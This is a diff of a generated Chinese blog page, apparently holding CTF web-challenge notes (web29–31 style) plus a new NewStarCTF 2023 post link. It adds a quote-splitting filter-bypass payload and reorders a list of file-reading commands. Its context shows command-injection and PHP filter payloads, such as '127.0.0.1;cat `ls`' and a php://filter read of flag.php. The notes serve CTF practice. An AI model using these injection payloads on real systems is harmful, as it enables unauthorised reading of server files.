@@ -120,7 +120,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(16)</small>
+                <small>(17)</small>
             
         </div>
     </li>
@@ -145,8 +145,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="16">
-<input type="hidden" id="yelog_site_word_count" value="38.9k">
+<input type="hidden" id="yelog_site_posts_number" value="17">
+<input type="hidden" id="yelog_site_word_count" value="41k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -243,6 +243,15 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/09/26/NewStarCTF-2023/"
+           data-tag="buuctf"
+           data-author="" >
+            <span class="post-title" title="NewStarCTF_2023">NewStarCTF_2023</span>
+            <span class="post-date" title="2023-09-26 20:59:08">2023/09/26</span>
+        </a>
         
         
         <a  class="全部文章 "
@@ -425,7 +434,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-09-09 16:48:18'>2023-04-09 19:52</time>
+            发布时间 : <time class="date" title='最后更新: 2023-09-27 22:37:17'>2023-04-09 19:52</time>
         
     </div>
     <div class="article-meta">
@@ -474,6 +483,7 @@
 5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //通过变量赋值直接绕过c的过滤
 ?ip=127.0.0.1;cat `ls` //内联执行，就是将反引号内命令的输出作为输入执行
 cp fla&#123;g.php,G&#125;    //把flag.php复制为flaG
+6.c=`c&#39;a&#39;t /flag` //绕过字符串的过滤
 </code></pre>
 <p>可以读取文件的函数：</p>
 <pre><code>readfile()		读取文件 
@@ -499,7 +509,8 @@ pcntl_exec()
 <h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;
 </code></pre>
 <p>文件读取命令</p>
-<pre><code>more:	一页一页的显示档案内容
+<pre><code>sort:	文件排序并输出也可以查看内容
+more:	一页一页的显示档案内容
 less:	与 more 类似 head:查看头几行
 tac:	从最后一行开始显示，可以看出 tac 是cat 的反向显示
 tail:	查看尾几行
@@ -507,7 +518,6 @@ nl:	显示内容，顺便输出行号
 od:	以二进制的方式读取档案内容
 vi:	一种编辑器，这个也可以查看
 vim:	一种编辑器，这个也可以查看
-sort:	文件排序并输出也可以查看内容
 uniq:	可以查看 file -f:报错出具体内容
 grep	grep &#123; flag.php打印有”&#123;“的一行
 strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings。通常用法：strings\$IFS\$9f*(必须加转义字符)
